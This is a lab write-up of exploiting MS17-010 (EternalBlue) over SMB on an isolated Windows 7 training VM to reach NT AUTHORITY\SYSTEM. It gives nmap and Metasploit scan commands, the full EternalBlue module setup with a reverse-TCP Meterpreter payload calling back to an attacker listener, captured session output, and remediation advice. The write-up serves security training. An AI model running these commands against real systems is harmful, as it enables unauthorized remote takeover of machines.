Blue — Write-up

Result: SYSTEM access achieved

SYSTEM access on the isolated Windows 7 SP1 x64 VM. Saved terminal evidence confirms an EternalBlue session and its identity; the scan outputs in the source notes are expected examples.

Attack path: SMB discovery → MS17-010 checks → x64 EternalBlue → Meterpreter → NT AUTHORITY\SYSTEM.

Only identifying details are masked in screenshots: addresses, hostnames, personal usernames, identifying paths and session identifiers. Generic technical output remains visible. Address placeholders in command text are substitutions.

Target environment

  • Lab target: Blue, <LAB_TARGET>
  • Operating system: Windows 7 SP1
  • Architecture: x64
  • Service / application: SMB on TCP/445
  • Weakness investigated: MS17-010
  • Scope: Intentionally vulnerable, isolated training VM

Attacking machine: Kali Linux, <LAB_KALI>. Payload: x64 Meterpreter.

Intentionally vulnerable, isolated training VM. Commands are lab-only; LAB_TARGET and LAB_KALI stand for the target and callback addresses on that isolated network. Credentials and unrelated local data are omitted.

1. Enumerate and check SMB

The notes’ enumeration sequence focuses on TCP/445 and verifies MS17-010 before exploitation. Set LAB_TARGET to the isolated VM address in the shell.

sudo nmap -p- -sC -sV -O -T4 "$LAB_TARGET" -oN blue_nmap.txt
nmap -Pn -p445 --script smb-vuln-ms17-010 "$LAB_TARGET"

# Metasploit scanner
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <LAB_TARGET>
run

A positive scanner result supports the vulnerability hypothesis; it does not demonstrate command execution. The supplied notes labels its scanner output as expected rather than a saved result.

2. Match the payload architecture

The retained configuration screenshot shows the EternalBlue module and x64 Meterpreter payload. This sequence reflects that configuration with addresses replaced:

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <LAB_TARGET>
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LAB_KALI>
set LPORT 4444
show options
check
exploit

The supplied walkthrough uses port 2222; the actual captured session uses 4444. Either is a configurable listener port, but 4444 is the historical value shown here. Target and payload architecture must agree.

3. Verify the session

The capture records a successful overwrite and an opened Meterpreter session. whoami at the Meterpreter prompt failed as an unknown command; getuid correctly identified the session:

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
OS: Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture: x64
Meterpreter: x64/windows

These are selected captured lines, with the local machine name omitted. The notes also recommends native-shell verification; these are follow-up commands, not additional retained output:

# At the Meterpreter prompt
shell
# In the resulting Windows command shell
whoami
whoami /priv
hostname

4. Findings and remediation

Vulnerable SMB service

Apply applicable MS17-010 fixes and migrate unsupported Windows systems.

Legacy protocol exposure

Disable SMBv1 where unnecessary and restrict SMB reachability.

High-impact execution

The recorded session already had SYSTEM privileges; this path needed no separate local escalation.

Conclusion

Evidence limits

The saved terminal confirms the module, payload, opened session, and SYSTEM identity. Scanner output in the supplied notes remains illustrative. Original notes record a VM crash, so successful exploitation must not be equated with stability. No remediation retest is claimed.
